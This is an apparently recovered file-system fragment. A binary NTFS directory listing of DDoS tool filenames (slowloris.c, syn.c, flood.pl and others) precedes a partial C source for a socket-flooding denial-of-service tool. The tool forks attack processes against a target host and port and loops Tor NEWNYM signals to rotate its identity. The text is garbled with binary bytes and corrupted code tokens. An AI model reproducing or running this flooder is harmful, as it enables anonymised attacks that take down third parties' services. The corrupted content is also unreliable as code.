INDX( 	 sJ            (   8  è       Ò      ntk(          ‡      ` P     †      æ5Ñ{DÒU†ßKuÀÑJB$:wDÒæ5Ñ{DÒ       Ä               . b a s h r c ˆ      h R     †      ¶äÒ{DÒq‘µfuÀÑÓU$:wDÒ¶äÒ{DÒ˜       –                . p r o f i l e       Š      ` N     †      ‚VuÔ{DÒ]’þtÀÑÓU$:wDÒ‚VuÔ{DÒ     •ˆ             4 2 0 . p l   Ž      ` N     †      ÍÓì{DÒxÎìÉtÀÑhi$:wDÒÍÓì{DÒ       y               d g h . p l         ` P     †      ~ð±õ{DÒ4 ¶´tÀÑhi$:wDÒ~ð±õ{D        @
               d i c k . p l       h R     †      r x |DÒ6³ŒtÀÑhi$:wDÒr x |DÒ                      f l o o d . p l       ‘      ` P     †      ßÅ} |DÒ˜H}tÀÑï|$:wDÒßÅ} |DÒ       	               f r a g . p l “      h T     †      ºÆ|DÒ˜[ œ7²Ñï|$:wDÒºÆ|DÒ       ý              	 g o t t . 1 . p l     ”      h T     †      ;}|DÒP©­7²Ñn$:wDÒ;}|DÒÐ      É              	 g o t t . 2 . p y     •      h T     †      Hô|DÒ‰!•z™mÐø£$:wDÒHô|DÒ      ’              	 g o t t . 3 . p l     —      h T     †      ·Um"|DÒC…1r¼Ñø£$:wDÒ·Um"|DÒ                     	 g o t t . 4 . p l     ˜      ` N     †      •i'|DÒ —bd›ÌŠ·$:wDÒ•i'|DÒ        4               g o t t . c   š      ` J     †      ±q5,|DÒ3êúñÌÑË$:wDÒ±q5,|DÒ @      <               m e n u       œ      ` P     †      ,§t/|DÒV'?ÙsÀÑË$:wDÒ,§t/|DÒ       ÷               n o o b . p l ž      h X     †      /¥2|DÒ ‰fÉK‚Ì˜Þ$:wDÒ/¥2|DÒ       m              s l o w l o r i s . c        h R     †      tÓ‘3|DÒ4•Úâþ²Ñ˜Þ$:wDÒtÓ‘3|DÒ       {               s m a s h . p l       ¡      ` L     †      Þ½’3|DÒÉ¿¾¬mÀÑò$:wDÒÞ½’3|DÒ       Û               s y n . c     ¤      ` P     †      gö“3|DÒ¤ô7mÀÑò$:wDÒgö“3|DÒ       Û
               w e e d . p l                     if(sockets[x] == 0)
                                sockets[x] = make_socket(host, port);
                        r=write(sockets[x], "\0", 1);
                       if(r == -1) {
                                close(sockets[x]);
                                sockets[x] = make_socket(host, port);
                        } else
//                              fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
                        fprintf(stderr, "[%i: Voly Sent]\n", id);
                }
                fprintf(stderr, "[%i: Voly Sent]\n", id);
                usleep(300000);
        }
}
 
void cycle_identity() {
        int r;
        i  socket = make_socket("localhost", "9050");
        write(socket, "AUTHENTICATE \"\"\n", 16);
        while(1) {
                r=write(socket, "signal NEWNYM\n\x00", 16);
                fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
                usleep(300000);
        }
}
 
int main(int argc, char **argv) {
        int x;
        if(argc !=3)
                cycle_identity();
        for(x=0; x != THREADS; x++) {
                if(fork())
                        attac argv[1], argv[2], x);
                usleep(200000);
        }
        getc(stdin);
        return 0;
}